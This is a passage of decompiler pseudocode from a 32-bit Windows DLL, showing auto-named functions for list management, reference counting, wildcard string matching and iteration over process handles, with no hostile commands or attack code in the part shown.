          sub_100128CB(v5);
          sub_10021957((int)v8, (int *)dword_1017E0F4);
          LOBYTE(v11) = 6;
          sub_100232D7((int)v8);
          ++v0;
        }
        while ( v0 < v7 );
      }
      v2 = 1;
    }
    else
    {
      v2 = 0;
    }
    LOBYTE(v11) = 3;
    sub_10023A20(v9);
    LOBYTE(v11) = 0;
    sub_10023A20(v10);
    v11 = -1;
    sub_100079EC((int)&v6);
    return v2;
  }
  else
  {
    v11 = -1;
    sub_100079EC((int)&v6);
    return 0;
  }
}
// 1017E0F4: using guessed type int dword_1017E0F4;
// 10023A8A: using guessed type int var_38[11];
// 10023A8A: using guessed type int var_60[10];
// 10023A8A: using guessed type _DWORD var_78[6];

//----- (10023C42) --------------------------------------------------------
bool __usercall sub_10023C42@<al>(int a1@<edi>)
{
  void *v1; // ecx
  int v2; // eax
  _DWORD *v3; // eax
  _DWORD *v4; // eax
  bool v5; // bl
  int v6; // ecx
  int v8[4]; // [esp+Ch] [ebp-44h] BYREF
  int v9[4]; // [esp+1Ch] [ebp-34h] BYREF
  int v10[2]; // [esp+2Ch] [ebp-24h] BYREF
  void *v11[2]; // [esp+34h] [ebp-1Ch] BYREF
  int v12; // [esp+3Ch] [ebp-14h] BYREF
  int v13; // [esp+4Ch] [ebp-4h]

  sub_100147E7();
  if ( dword_1017A020 != 6 && dword_1017A020 != 7 )
    return 0;
  v2 = sub_10014782(v1);
  if ( v2 == 3 || v2 == 2 )
    return 0;
  sub_10024DF2(v8);
  v13 = 0;
  (*(void (__thiscall **)(int *, void **))(v8[0] + 8))(v8, v11);
  LOBYTE(v13) = 1;
  while ( !(*(unsigned __int8 (__thiscall **)(void *))(*(_DWORD *)v11[0] + 4))(v11[0]) )
  {
    v3 = (_DWORD *)(*(int (__thiscall **)(void *))(*(_DWORD *)v11[0] + 12))(v11[0]);
    sub_1001BF9A(v9, v3);
    LOBYTE(v13) = 2;
    v4 = sub_10020EF4((int)v9, v10);
    LOBYTE(v13) = 3;
    v5 = sub_1000DE70((int)v4, (int)&unk_10186A20);
    LOBYTE(v13) = 2;
    sub_1000D3AD(v10);
    if ( v5 )
    {
      v12 = v9[0];
      (*(void (__thiscall **)(int, int *))(*(_DWORD *)a1 + 36))(a1, &v12);
    }
    sub_10021F56(v6, (int)v11[0]);
    LOBYTE(v13) = 1;
    sub_1001BDAA((int)v9);
  }
  LOBYTE(v13) = 0;
  sub_1002228F(v11);
  v13 = -1;
  sub_10024E24(v8);
  return (*(int (__thiscall **)(int))(*(_DWORD *)a1 + 4))(a1) != 0;
}
// 10023C69: variable 'v1' is possibly undefined
// 10023CF7: variable 'v6' is possibly undefined
// 1017A020: using guessed type int dword_1017A020;

//----- (10023D4C) --------------------------------------------------------
void __stdcall sub_10023D4C(int *a1)
{
  sub_1000D3AD(a1 + 8);
  sub_10023DCC(a1 + 4);
  sub_10020B81(a1);
}

//----- (10023D8F) --------------------------------------------------------
_DWORD *__stdcall sub_10023D8F(_DWORD *a1)
{
  _DWORD *result; // eax

  result = a1;
  *a1 = off_100FBF5C;
  *a1 = &off_10103028;
  a1[1] = 0;
  a1[2] = 0;
  a1[3] = 0;
  return result;
}
// 100FBF5C: using guessed type int (__thiscall *off_100FBF5C[2])(void *Block, char);
// 10103028: using guessed type int (__thiscall *off_10103028)(void *Block, char);

//----- (10023DCC) --------------------------------------------------------
void *__thiscall sub_10023DCC(_DWORD *this)
{
  int i; // eax
  int v3; // edi
  _DWORD v5[5]; // [esp+0h] [ebp-20h] BYREF
  int v6; // [esp+1Ch] [ebp-4h]

  v5[4] = v5;
  v5[3] = this;
  *this = &off_10103028;
  v6 = 1;
  for ( i = this[1]; i; i = v3 )
  {
    v3 = *(_DWORD *)(i + 8);
    sub_10023F1D((void **)i);
  }
  v6 = -1;
  return sub_100185A9(this);
}
// 10103028: using guessed type int (__thiscall *off_10103028)(void *Block, char);

//----- (10023E32) --------------------------------------------------------
_DWORD *__thiscall sub_10023E32(_DWORD *this, _DWORD *a2)
{
  _DWORD *v3; // eax
  int v4; // ecx

  v3 = operator new(0x10u);
  if ( v3 )
  {
    v4 = this[1];
    v3[2] = 0;
    v3[1] = this;
    *v3 = &off_10103068;
    v3[3] = v4;
  }
  else
  {
    v3 = 0;
  }
  sub_10050B91(a2, (int)v3);
  return a2;
}
// 10103068: using guessed type int (__thiscall *off_10103068)(void *Block, char);

//----- (10023E98) --------------------------------------------------------
_DWORD *__thiscall sub_10023E98(_DWORD *this, _DWORD *a2)
{
  _DWORD *v3; // eax
  int v4; // ecx

  v3 = operator new(0x10u);
  if ( v3 )
  {
    v4 = this[2];
    v3[3] = 0;
    v3[1] = this;
    *v3 = &off_10103068;
    v3[2] = v4;
  }
  else
  {
    v3 = 0;
  }
  sub_10050B91(a2, (int)v3);
  return a2;
}
// 10103068: using guessed type int (__thiscall *off_10103068)(void *Block, char);

//----- (10023EFE) --------------------------------------------------------
_DWORD *__thiscall sub_10023EFE(_DWORD *Block, char a2)
{
  sub_10023DCC(Block);
  if ( (a2 & 1) != 0 )
    j__free(Block);
  return Block;
}

//----- (10023F1D) --------------------------------------------------------
void **__stdcall sub_10023F1D(void **Block)
{
  sub_1002415C(Block);
  j__free(Block);
  return Block;
}

//----- (10023F4D) --------------------------------------------------------
int __thiscall sub_10023F4D(_DWORD *this)
{
  int v1; // eax
  _DWORD *v2; // eax
  int result; // eax
  _DWORD v4[4]; // [esp+0h] [ebp-10h] BYREF

  v4[0] = this;
  v1 = this[3];
  if ( !v1 )
  {
    v2 = sub_1000E8EF(v4);
    v4[3] = 0;
    sub_100078FE((int)v2);
  }
  this[2] = v1;
  result = *(_DWORD *)(v1 + 8);
  this[3] = result;
  return result;
}

//----- (10023F8C) --------------------------------------------------------
int __thiscall sub_10023F8C(_DWORD *this)
{
  int v1; // eax
  _DWORD *v2; // eax
  int result; // eax
  _DWORD v4[4]; // [esp+0h] [ebp-10h] BYREF

  v4[0] = this;
  v1 = this[2];
  if ( !v1 )
  {
    v2 = sub_1000E8EF(v4);
    v4[3] = 0;
    sub_100078FE((int)v2);
  }
  this[3] = v1;
  result = *(_DWORD *)(v1 + 12);
  this[2] = result;
  return result;
}

//----- (10023FCB) --------------------------------------------------------
void **__thiscall sub_10023FCB(int this)
{
  int v2; // eax
  _DWORD *v3; // eax
  int v4; // edi
  int v5; // eax
  int v6; // eax
  int v7; // eax
  void **result; // eax
  _DWORD v9[4]; // [esp+8h] [ebp-10h] BYREF

  v2 = *(_DWORD *)(this + 12);
  if ( !v2 )
  {
    v3 = sub_1000E8EF(v9);
    v9[3] = 0;
    sub_100078FE((int)v3);
  }
  v4 = *(_DWORD *)(v2 + 8);
  v5 = *(_DWORD *)(this + 8);
  if ( v5 )
    *(_DWORD *)(v5 + 8) = v4;
  if ( v4 )
    *(_DWORD *)(v4 + 12) = *(_DWORD *)(this + 8);
  v6 = *(_DWORD *)(this + 4);
  if ( *(_DWORD *)(v6 + 4) == *(_DWORD *)(this + 12) )
    *(_DWORD *)(v6 + 4) = v4;
  v7 = *(_DWORD *)(this + 4);
  if ( *(_DWORD *)(v7 + 8) == *(_DWORD *)(this + 12) )
    *(_DWORD *)(v7 + 8) = *(_DWORD *)(this + 8);
  result = *(void ***)(this + 12);
  if ( result )
    result = sub_10023F1D(*(void ***)(this + 12));
  *(_DWORD *)(this + 12) = v4;
  --*(_DWORD *)(*(_DWORD *)(this + 4) + 12);
  return result;
}

//----- (10024053) --------------------------------------------------------
int *__thiscall sub_10024053(_DWORD *this, int *a2)
{
  void *v3; // eax
  volatile LONG *v4; // ecx
  int v5; // ecx
  int *result; // eax
  int v7; // ecx
  int v8; // ecx
  volatile LONG *v9; // [esp-10h] [ebp-28h] BYREF
  volatile LONG *v10; // [esp-Ch] [ebp-24h]
  int v11; // [esp-8h] [ebp-20h]
  volatile LONG *v12; // [esp-4h] [ebp-1Ch]
  int *v13; // [esp+4h] [ebp-14h]
  void *Block; // [esp+8h] [ebp-10h]
  int v15; // [esp+14h] [ebp-4h]

  ++*(_DWORD *)(this[1] + 12);
  v3 = operator new(0x10u);
  v4 = v12;
  Block = v3;
  v15 = 0;
  if ( v3 )
  {
    v12 = (volatile LONG *)this[2];
    v11 = this[3];
    v10 = v4;
    v9 = v4;
    v10 = (volatile LONG *)a2[1];
    v5 = *a2;
    v13 = (int *)&v9;
    v9 = (volatile LONG *)v5;
    InterlockedIncrement(v10);
    LOBYTE(v15) = 0;
    result = sub_1002410A((int *)Block, (int)v9, v10, v11, (int)v12);
  }
  else
  {
    result = 0;
  }
  v15 = -1;
  v7 = this[2];
  if ( v7 )
    *(_DWORD *)(v7 + 8) = result;
  else
    *(_DWORD *)(this[1] + 4) = result;
  v8 = this[3];
  this[2] = result;
  if ( v8 )
    *(_DWORD *)(v8 + 12) = result;
  else
    *(_DWORD *)(this[1] + 8) = result;
  return result;
}

//----- (100240EA) --------------------------------------------------------
_DWORD *__thiscall sub_100240EA(_DWORD *Block, char a2)
{
  *Block = &off_10103068;
  if ( (a2 & 1) != 0 )
    j__free(Block);
  return Block;
}
// 10103068: using guessed type int (__thiscall *off_10103068)(void *Block, char);

//----- (1002410A) --------------------------------------------------------
int *__stdcall sub_1002410A(int *a1, int a2, volatile LONG *lpAddend, int a4, int a5)
{
  int v5; // ecx
  volatile LONG *v7; // [esp-4h] [ebp-14h]

  v5 = a2;
  v7 = lpAddend;
  a1[1] = (int)lpAddend;
  *a1 = v5;
  InterlockedIncrement(v7);
  a1[2] = a4;
  a1[3] = a5;
  sub_1002415C((void **)&a2);
  return a1;
}

//----- (1002415C) --------------------------------------------------------
void __stdcall sub_1002415C(void **a1)
{
  _DWORD v1[7]; // [esp+0h] [ebp-1Ch] BYREF

  v1[3] = v1;
  v1[6] = 0;
  sub_10024198(a1);
}

//----- (10024198) --------------------------------------------------------
void __usercall sub_10024198(void **a1@<eax>)
{
  void *v2; // esi

  if ( !InterlockedDecrement((volatile LONG *)a1[1]) )
  {
    if ( a1[1] )
      j__free(a1[1]);
    v2 = *a1;
    if ( v2 )
    {
      sub_100241CB((int)v2);
      j__free(v2);
    }
  }
}

//----- (100241CB) --------------------------------------------------------
void __stdcall sub_100241CB(int a1)
{
  sub_1000D3AD((int *)(a1 + 12));
  sub_1000D3AD((int *)(a1 + 4));
}

//----- (10024200) --------------------------------------------------------
char __cdecl sub_10024200(int a1, int a2, int a3, int a4)
{
  int v4; // ecx
  char v5; // bl
  unsigned int v6; // edi
  int v7; // ecx
  unsigned int v8; // eax
  unsigned int v10; // [esp+8h] [ebp-14h]
  char i; // [esp+Fh] [ebp-Dh]

  v5 = 1;
  v6 = 0;
  v10 = 0;
  for ( i = 0; v6 < *(_DWORD *)(a2 + 28); ++v6 )
  {
    if ( *(_WORD *)sub_1000D52B(v4, v6, &a1) == 42 )
      i = 1;
    if ( *(_WORD *)sub_1000D52B(v7, v6, &a1) == 63 )
      ++v10;
  }
  v8 = *(_DWORD *)(a4 + 28);
  if ( v10 != v8 && (!i || v10 > v8) )
    v5 = 0;
  sub_1000D3AD(&a1);
  sub_1000D3AD(&a3);
  return v5;
}
// 10024229: variable 'v4' is possibly undefined
// 1002423A: variable 'v7' is possibly undefined

//----- (10024292) --------------------------------------------------------
_DWORD *__cdecl sub_10024292(_DWORD *a1, int a2, int a3, unsigned int *a4)
{
  int v4; // ecx
  unsigned int v5; // ebx
  unsigned int v6; // edi
  unsigned int v8; // [esp+Ch] [ebp-18h]
  unsigned int v9; // [esp+10h] [ebp-14h]
  unsigned int v10; // [esp+14h] [ebp-10h]

  v5 = 0;
  v6 = 0;
  v10 = 0;
  v8 = 0;
  v9 = 0;
  if ( *(_DWORD *)(a3 + 28) )
  {
    do
    {
      if ( *(_WORD *)sub_1000D52B(v4, v6, &a2) == 63 || *(_WORD *)sub_1000D52B(v4, v6, &a2) == 42 )
      {
        if ( v10 > v9 )
        {
          v5 = v8;
          v9 = v10;
        }
        v10 = 0;
        v8 = v6 + 1;
      }
      else
      {
        ++v10;
      }
      ++v6;
    }
    while ( v6 < *(_DWORD *)(a3 + 28) );
    if ( v10 > v9 )
    {
      v5 = v8;
      v9 = v10;
    }
  }
  *a4 = v5;
  sub_1000D836(v9, (int)&a2, a1, v5);
  sub_1000D3AD(&a2);
  return a1;
}
// 100242C7: variable 'v4' is possibly undefined

//----- (1002434A) --------------------------------------------------------
char __cdecl sub_1002434A(int a1, int a2, int a3, int a4)
{
  int v4; // ecx
  bool v5; // bl
  unsigned int *v6; // ecx
  int v7; // ecx
  char v8; // bl
  int v10; // esi
  void *v11; // edi
  unsigned int *v12; // ecx
  int v13; // ecx
  unsigned int *v14; // ecx
  int v15; // ecx
  int v16; // [esp-10h] [ebp-58h] BYREF
  int v17; // [esp-Ch] [ebp-54h] BYREF
  unsigned int *v18; // [esp-8h] [ebp-50h] BYREF
  unsigned int *v19; // [esp-4h] [ebp-4Ch]
  int v20[2]; // [esp+Ch] [ebp-3Ch] BYREF
  int v21[2]; // [esp+14h] [ebp-34h] BYREF
  int v22[2]; // [esp+1Ch] [ebp-2Ch] BYREF
  int v23[2]; // [esp+24h] [ebp-24h] BYREF
  int v24; // [esp+2Ch] [ebp-1Ch] BYREF
  int v25; // [esp+30h] [ebp-18h]
  void *v26; // [esp+34h] [ebp-14h]
  void *v27; // [esp+38h] [ebp-10h] BYREF
  int v28; // [esp+44h] [ebp-4h]

  v28 = 1;
  v19 = (unsigned int *)&v27;
  v18 = (unsigned int *)v4;
  v17 = v4;
  v27 = &v17;
  sub_1000D372(&v17, (int)&a1);
  LOBYTE(v28) = 1;
  sub_10024292(&v24, v17, (int)v18, v19);
  LOBYTE(v28) = 3;
  sub_1000D17D(v20, &word_10178E9C);
  LOBYTE(v28) = 4;
  v5 = sub_1000D65C((int)v20, (int)&v24) == 0;
  LOBYTE(v28) = 3;
  sub_1000D3AD(v20);
  if ( v5 )
  {
    v19 = v6;
    v18 = v6;
    v27 = &v18;
    sub_1000D372(&v18, (int)&a3);
    LOBYTE(v28) = 5;
    v17 = v7;
    v16 = v7;
    v26 = &v16;
    sub_1000D372(&v16, (int)&a1);
    LOBYTE(v28) = 3;
    v8 = sub_10024200(v16, v17, (int)v18, (int)v19);
  }
  else if ( !*(_DWORD *)(a4 + 28) || (v10 = sub_1000DF11(0, (int)&a3, (int)&v24), v10 == -1) )
  {
LABEL_5:
    v8 = 0;
  }
  else
  {
    v11 = v27;
    while ( 1 )
    {
      sub_1000D836(v10, (int)&a3, v20, 0);
      LOBYTE(v28) = 7;
      sub_1000D836((int)v11, (int)&a1, v21, 0);
      LOBYTE(v28) = 8;
      sub_1000D836(-2, (int)&a3, v22, v10 + *(_DWORD *)(v25 + 28));
      LOBYTE(v28) = 9;
      sub_1000D836(-2, (int)&a1, v23, (unsigned int)v11 + *(_DWORD *)(v25 + 28));
      LOBYTE(v28) = 10;
      v19 = v12;
      v18 = v12;
      v26 = &v18;
      sub_1000D372(&v18, (int)v20);
      LOBYTE(v28) = 11;
      v17 = v13;
      v16 = v13;
      v27 = &v16;
      sub_1000D372(&v16, (int)v21);
      LOBYTE(v28) = 10;
      if ( (unsigned __int8)sub_1002434A(v16, v17, (char)v18, v19) )
      {
        v19 = v14;
        v18 = v14;
        v26 = &v18;
        sub_1000D372(&v18, (int)v22);
        LOBYTE(v28) = 13;
        v17 = v15;
        v16 = v15;
        v27 = &v16;
        sub_1000D372(&v16, (int)v23);
        LOBYTE(v28) = 10;
        if ( (unsigned __int8)sub_1002434A(v16, v17, (char)v18, v19) )
          break;
      }
      LOBYTE(v28) = 9;
      sub_1000D3AD(v23);
      LOBYTE(v28) = 8;
      sub_1000D3AD(v22);
      LOBYTE(v28) = 7;
      sub_1000D3AD(v21);
      LOBYTE(v28) = 3;
      sub_1000D3AD(v20);
      v10 = sub_1000DF11(v10 + 1, (int)&a3, (int)&v24);
      if ( v10 == -1 )
        goto LABEL_5;
    }
    LOBYTE(v28) = 9;
    sub_1000D3AD(v23);
    LOBYTE(v28) = 8;
    sub_1000D3AD(v22);
    LOBYTE(v28) = 7;
    sub_1000D3AD(v21);
    LOBYTE(v28) = 3;
    sub_1000D3AD(v20);
    v8 = 1;
  }
  LOBYTE(v28) = 1;
  sub_1000D3AD(&v24);
  LOBYTE(v28) = 0;
  sub_1000D3AD(&a1);
  v28 = -1;
  sub_1000D3AD(&a3);
  return v8;
}
// 10024365: variable 'v4' is possibly undefined
// 100243C3: variable 'v6' is possibly undefined
// 100243D8: variable 'v7' is possibly undefined
// 100244B4: variable 'v12' is possibly undefined
// 100244C9: variable 'v13' is possibly undefined
// 100244EE: variable 'v14' is possibly undefined
// 10024503: variable 'v15' is possibly undefined

//----- (100245AE) --------------------------------------------------------
_DWORD *__stdcall sub_100245AE(_DWORD *a1)
{
  sub_1000E7F7(a1, 1, 0);
  *a1 = &off_10102A68;
  return a1;
}
// 10102A68: using guessed type int (__thiscall *off_10102A68)(void *Block, char);

//----- (100245E6) --------------------------------------------------------
int __stdcall sub_100245E6(int a1, int a2)
{
  int v2; // eax
  DWORD v3; // eax
  DWORD v4; // edi
  _DWORD *v5; // esi
  void *v6; // ecx
  LONG *v7; // edi
  int v8; // esi
  _DWORD *v10; // eax
  DWORD CurrentProcessId; // [esp-4h] [ebp-4Ch]
  int v12[7]; // [esp+Ch] [ebp-3Ch] BYREF
  int v13[4]; // [esp+28h] [ebp-20h] BYREF
  int pExceptionObject; // [esp+38h] [ebp-10h] BYREF
  int v15; // [esp+44h] [ebp-4h]

  v2 = a2;
  *(_DWORD *)a1 = &off_10102F6C;
  *(_DWORD *)(a1 + 4) = v2;
  v15 = 0;
  *(_DWORD *)a1 = &off_10103088;
  a2 = a1 + 8;
  sub_1001C7A1((_DWORD *)(a1 + 8), 0, 0);
  pExceptionObject = a1 + 20;
  v13[3] = a1 + 20;
  sub_1000B1F3(0, a1 + 20, 0);
  *(_DWORD *)(a1 + 40) = 0;
  *(_DWORD *)(a1 + 44) = 0;
  *(_DWORD *)(a1 + 48) = &off_1010311C;
  *(_DWORD *)(a1 + 52) = 0;
  *(_DWORD *)(a1 + 56) = 0;
  *(_BYTE *)(a1 + 60) = 0;
  *(_DWORD *)(a1 + 64) = 0;
  *(_DWORD *)(a1 + 68) = 0;
  CurrentProcessId = GetCurrentProcessId();
  v3 = GetCurrentProcessId();
  sub_10011AF4(a1 + 76, (void *)0xFFFFFFFF, 0, 0, v3, CurrentProcessId);
  *(_BYTE *)(a1 + 88) = 0;
  sub_10024CA7((_DWORD *)(a1 + 92));
  LOBYTE(v15) = 6;
  v4 = *(_DWORD *)(a1 + 4);
  if ( !v4 || v4 == -1 )
  {
    v10 = sub_100245AE(&a2);
    LOBYTE(v15) = 7;
    sub_1000EE19(&pExceptionObject, (int)v10);
    _CxxThrowException(&pExceptionObject, (_ThrowInfo *)&_TI2_AVMxpteqpIoxoylsrdYuvyamxpt_sr__);
  }
  sub_1002110D(v4);
  v5 = sub_1001C9F1(v13);
  LOBYTE(v15) = 8;
  sub_100130E8(v5 + 1, (int *)(a2 + 4));
  *(_DWORD *)(a2 + 8) = v5[2];
  LOBYTE(v15) = 6;
  sub_100128CB(v13);
  if ( !byte_1013DA12 )
    byte_1013DA12 = sub_10025D38(v6);
  v7 = sub_10025F26(v12);
  LOBYTE(v15) = 9;
  v8 = pExceptionObject;
  sub_1000B3BD(v7, pExceptionObject);
  *(_DWORD *)(v8 + 20) = v7[5];
  *(_DWORD *)(v8 + 24) = v7[6];
  LOBYTE(v15) = 6;
  sub_10024785(v12);
  sub_1002481B(a1);
  v15 = -1;
  return a1;
}
// 100246DF: variable 'v6' is possibly undefined
// 10102F6C: using guessed type int (__thiscall *off_10102F6C)(void *Block, char);
// 10103088: using guessed type int (__thiscall *off_10103088)(void *Block, char);
// 1010311C: using guessed type int (__thiscall *off_1010311C)(void *Block, char);
// 1013DA12: using guessed type char byte_1013DA12;
// 100245E6: using guessed type int var_3C[7];

//----- (10024766) --------------------------------------------------------
int *__thiscall sub_10024766(int *Block, char a2)
{
  sub_100247A9(Block);
  if ( (a2 & 1) != 0 )
    j__free(Block);
  return Block;
}

//----- (10024785) --------------------------------------------------------
void __stdcall sub_10024785(int *a1)
{
  sub_1000B3DF(a1);
}

//----- (100247A9) --------------------------------------------------------
void __thiscall sub_100247A9(int *this)
{
  *this = (int)&off_10103088;
  sub_10024D04(this + 23);
  sub_1000A159(this + 19);
  this[12] = (int)&off_1010311C;
  sub_10024785(this + 5);
  sub_100128CB(this + 2);
  *this = (int)&off_10102F6C;
}
// 10102F6C: using guessed type int (__thiscall *off_10102F6C)(void *Block, char);
// 10103088: using guessed type int (__thiscall *off_10103088)(void *Block, char);
// 1010311C: using guessed type int (__thiscall *off_1010311C)(void *Block, char);

//----- (10024817) --------------------------------------------------------
char __thiscall sub_10024817(_BYTE *this)
{
  return this[88];
}

//----- (1002481B) --------------------------------------------------------
unsigned int __thiscall sub_1002481B(int this)
{
  void *v2; // ecx
  unsigned int result; // eax
  DWORD v4; // eax
  int v5; // eax
  int v6; // edi
  int v7; // esi
  DWORD v8; // eax
  int v9; // eax
  void *v10; // eax
  int v11; // eax
  int v12; // ebx
  int v13; // eax
  _DWORD *v14; // eax
  int v15; // [esp-8h] [ebp-70h] BYREF
  int *CurrentProcessId; // [esp-4h] [ebp-6Ch]
  int v17; // [esp+0h] [ebp-68h] BYREF
  char *v18; // [esp+4h] [ebp-64h]
  DWORD v19; // [esp+8h] [ebp-60h]
  int *v20; // [esp+Ch] [ebp-5Ch] BYREF
  char v21; // [esp+28h] [ebp-40h] BYREF
  int v22; // [esp+30h] [ebp-38h]
  void *v23; // [esp+34h] [ebp-34h]
  void *v24[2]; // [esp+44h] [ebp-24h] BYREF
  void *v25; // [esp+4Ch] [ebp-1Ch] BYREF
  int v26[3]; // [esp+50h] [ebp-18h] BYREF
  int v27; // [esp+64h] [ebp-4h]

  v26[2] = (int)&v17;
  v24[1] = (void *)this;
  if ( (*(unsigned __int8 (__thiscall **)(int))(*(_DWORD *)this + 8))(this) )
    sub_10024A3D(v2);
  if ( (dword_10193B28 & 1) == 0 )
  {
    dword_10193B28 |= 1u;
    v27 = 0;
    CurrentProcessId = (int *)v2;
    v15 = (int)v2;
    v25 = &v15;
    sub_1000D372(&v15, (int)&unk_10186A50);
    LOBYTE(v27) = 0;
    dword_101832A8 = (int (__stdcall *)(_DWORD))sub_1001E665((int)&unk_10186A48);
    v27 = -1;
  }
  while ( 1 )
  {
    result = *(_DWORD *)(this + 40);
    if ( result <= *(_DWORD *)(this + 44) )
      break;
    CurrentProcessId = (int *)GetCurrentProcessId();
    v4 = GetCurrentProcessId();
    sub_1000A198((HANDLE *)(this + 76), (HANDLE)0xFFFFFFFF, 0, 0, v4, (DWORD)CurrentProcessId);
    *(_DWORD *)(this + 84) = 0;
    v5 = sub_10026045((_DWORD *)(this + 20), (int)&v20);
    v27 = 2;
    v6 = this + 48;
    (*(void (__thiscall **)(int, int))(*(_DWORD *)(this + 48) + 4))(this + 48, v5);
    v27 = -1;
    v20 = (int *)&off_1010311C;
    v7 = sub_1001C78D((_DWORD *)(this + 8));
    if ( (*(int (__thiscall **)(int))(*(_DWORD *)(this + 48) + 8))(this + 48) == v7
      && (*(unsigned __int8 (__thiscall **)(int))(*(_DWORD *)v6 + 32))(this + 48) == byte_1013DA12 )
    {
      v27 = 3;
      v8 = GetCurrentProcessId();
      v9 = (*(int (__thiscall **)(int, DWORD))(*(_DWORD *)v6 + 8))(this + 48, v8);
      v10 = (void *)(*(int (__thiscall **)(int, int, _DWORD, int))(*(_DWORD *)v6 + 12))(this + 48, 1, 0, v9);
      sub_1000A198((HANDLE *)(this + 76), v10, v17, (BOOL)v18, v19, (DWORD)v20);
      v27 = -1;
      v26[0] = 28;
      v11 = *(_DWORD *)(this + 80);
      v20 = v26;
      v19 = 28;
      v18 = &v21;
      v17 = 0;
      if ( dword_101832A8(v11) < 0 )
      {
        v12 = *(_DWORD *)(this + 80);
        CurrentProcessId = v26;
        v15 = v26[0];
        v13 = dword_101832A8(v12);
        v14 = sub_10050D97(v24, v13);
        v27 = 5;
        sub_10015338((int)v14, 101);
      }
      if ( v22 == *(_DWORD *)(this + 4) )
      {
        v25 = v23;
        if ( !(*(unsigned __int8 (__thiscall **)(int, void **))(*(_DWORD *)(this + 92) + 4))(this + 92, &v25) )
        {
          *(_DWORD *)(this + 84) = v23;
          result = (*(int (__thiscall **)(int, int))(*(_DWORD *)(this + 92) + 8))(this + 92, this + 84);
          *(_BYTE *)(this + 88) = 0;
          return result;
        }
      }
    }
  }
  *(_BYTE *)(this + 88) = 1;
  return result;
}
// 1002483C: variable 'v2' is possibly undefined
// 1010311C: using guessed type int (__thiscall *off_1010311C)(void *Block, char);
// 1013DA12: using guessed type char byte_1013DA12;
// 101832A8: using guessed type int (__stdcall *dword_101832A8)(_DWORD);
// 10193B28: using guessed type int dword_10193B28;

//----- (100249DC) --------------------------------------------------------
int __thiscall sub_100249DC(_DWORD *this)
{
  void *v2; // ecx

  if ( (*(unsigned __int8 (__thiscall **)(_DWORD *))(*this + 8))(this) )
    sub_10024A3D(v2);
  return this[21];
}
// 100249E8: variable 'v2' is possibly undefined

//----- (100249F2) --------------------------------------------------------
_DWORD *__thiscall sub_100249F2(void **this, _DWORD *a2)
{
  void *v3; // ecx

  if ( (*((unsigned __int8 (__thiscall **)(void **))*this + 2))(this) )
    sub_10024A3D(v3);
  sub_10012621(a2, this[20], 1);
  return a2;
}
// 10024A0D: variable 'v3' is possibly undefined

//----- (10024A3D) --------------------------------------------------------
void __thiscall __noreturn sub_10024A3D(void *this)
{
  _DWORD *v1; // eax
  _DWORD v2[4]; // [esp+0h] [ebp-10h] BYREF

  v2[0] = this;
  v1 = sub_1000E8EF(v2);
  v2[3] = 0;
  sub_100078FE((int)v1);
}

//----- (10024A61) --------------------------------------------------------
_DWORD *__thiscall sub_10024A61(void *this, _DWORD *a2)
{
  _DWORD *v3; // eax
  _DWORD *v4; // esi
  _DWORD *v5; // eax
  _DWORD *v6; // ecx
  _DWORD *result; // eax

  v3 = operator new(0x18u);
  if ( v3 )
  {
    v3[1] = this;
    *v3 = &off_101030FC;
    v3[2] = off_10102FB8;
    v3[5] = 0;
    v4 = v3;
  }
  else
  {
    v4 = 0;
  }
  v5 = operator new(4u);
  if ( v5 )
  {
    *v5 = 1;
    v6 = v5;
  }
  else
  {
    v6 = 0;
  }
  result = a2;
  a2[1] = v6;
  *a2 = v4;
  return result;
}
// 10102FB8: using guessed type int (__thiscall *off_10102FB8[3])(void *Block, char);
// 101030FC: using guessed type int (__stdcall *off_101030FC)(char);

//----- (10024AF0) --------------------------------------------------------
void __thiscall sub_10024AF0(_DWORD *this)
{
  ++this[5];
}

//----- (10024AF4) --------------------------------------------------------
void __noreturn sub_10024AF4()
{
  int v0; // eax
  char v1[16]; // [esp+0h] [ebp-14h] BYREF
  int v2; // [esp+10h] [ebp-4h]

  v0 = sub_1000E950((int)v1);
  v2 = 0;
  sub_10007DD5(v0, 164);
}
// 10024AF4: using guessed type char var_14[16];

//----- (10024B19) --------------------------------------------------------
_DWORD *__thiscall sub_10024B19(_DWORD *this, char a2)
{
  this[2] = off_10102FB8;
  if ( (a2 & 1) != 0 )
    j__free(this);
  return this;
}
// 10102FB8: using guessed type int (__thiscall *off_10102FB8[3])(void *Block, char);

//----- (10024B53) --------------------------------------------------------
void *__thiscall sub_10024B53(_DWORD *this)
{
  *this = &off_101030C0;
  sub_10013F22((int)(this + 5));
  sub_100079EC((int)(this + 1));
  return sub_100185A9(this);
}
// 101030C0: using guessed type int (__thiscall *off_101030C0)(void *Block, char);

//----- (10024B9D) --------------------------------------------------------
int __thiscall sub_10024B9D(_DWORD *this, _DWORD *a2)
{
  _DWORD *v2; // esi
  int v4; // edi
  _DWORD *v6; // eax

  v2 = a2;
  v4 = sub_1003F0D1(this, a2);
  if ( v4 == (*(int (__thiscall **)(_DWORD *))(*this + 4))(this)
    || *(_DWORD *)(*(int (__thiscall **)(_DWORD *, int))(this[1] + 48))(this + 1, v4) != *v2 )
  {
    v6 = sub_1000E8EF(&a2);
    sub_100078FE((int)v6);
  }
  return (*(int (__thiscall **)(_DWORD *, int))(this[5] + 48))(this + 5, v4);
}

//----- (10024C04) --------------------------------------------------------
_BYTE *__thiscall sub_10024C04(void *this, int a2, char *a3)
{
  char v3; // bl
  _BYTE *result; // eax

  v3 = *a3;
  result = (_BYTE *)(*(int (__thiscall **)(void *, int))(*(_DWORD *)this + 16))(this, a2);
  *result = v3;
  return result;
}

//----- (10024C1C) --------------------------------------------------------
_DWORD *__thiscall sub_10024C1C(_DWORD *this, _DWORD *a2)
{
  sub_1000791E(this + 1, a2);
  return a2;
}

//----- (10024C54) --------------------------------------------------------
_DWORD *__thiscall sub_10024C54(_DWORD *this, _DWORD *a2)
{
  sub_10014490(this + 5, a2);
  return a2;
}

//----- (10024C8C) --------------------------------------------------------
int __thiscall sub_10024C8C(_DWORD *this, int a2)
{
  (*(void (__thiscall **)(_DWORD *, int))(this[1] + 60))(this + 1, a2);
  return (*(int (__thiscall **)(_DWORD *))(this[5] + 60))(this + 5);
}

//----- (10024CA7) --------------------------------------------------------
_DWORD *__stdcall sub_10024CA7(_DWORD *a1)
{
  *a1 = &off_1010309C;
  a1[1] = off_100FBF5C;
  a1[1] = &off_101030C0;
  sub_1001160C(a1 + 2, 0x10u);
  sub_10014563(a1 + 6);
  return a1;
}
// 100FBF5C: using guessed type int (__thiscall *off_100FBF5C[2])(void *Block, char);
// 1010309C: using guessed type int (__thiscall *off_1010309C)(void *Block, char);
// 101030C0: using guessed type int (__thiscall *off_101030C0)(void *Block, char);

//----- (10024D04) --------------------------------------------------------
